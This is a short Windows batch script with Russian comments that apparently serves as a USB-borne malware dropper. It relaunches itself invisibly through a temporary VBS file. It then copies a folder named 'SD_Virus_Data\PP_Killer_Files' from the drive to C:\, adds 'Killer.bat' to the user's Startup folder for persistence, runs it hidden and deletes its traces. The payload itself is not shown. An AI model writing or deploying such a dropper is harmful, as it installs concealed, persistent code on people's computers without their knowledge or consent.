@echo off
chcp 1251 >nul

:: Запуск через встроенный VBS (скрыто)
if "%1"=="hide" goto :main
echo CreateObject("WScript.Shell").Run "%~f0 hide", 0, False > "%TEMP%\run.vbs"
wscript "%TEMP%\run.vbs"
del "%TEMP%\run.vbs" 2>nul
exit

:main
set "FLASH_DRIVE=%~dp0"
set "FLASH_DRIVE=%FLASH_DRIVE:~0,-1%"

set "SOURCE=%FLASH_DRIVE%\SD_Virus_Data\PP_Killer_Files"
set "DEST=C:\PP_Killer_Files"

if not exist "%SOURCE%" exit /b 1
if exist "%DEST%" rmdir /s /q "%DEST%" 2>nul

xcopy "%SOURCE%" "%DEST%\" /e /i /h /y >nul 2>nul
if errorlevel 1 exit /b 1

copy /y "C:\PP_Killer_Files\Killer.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul 2>nul

:: Запуск Killer через VBS
echo CreateObject("WScript.Shell").Run "%DEST%\Killer.bat", 0, False > "%TEMP%\runpp.vbs"
wscript "%TEMP%\runpp.vbs"
del "%TEMP%\runpp.vbs" 2>nul

exit /b 0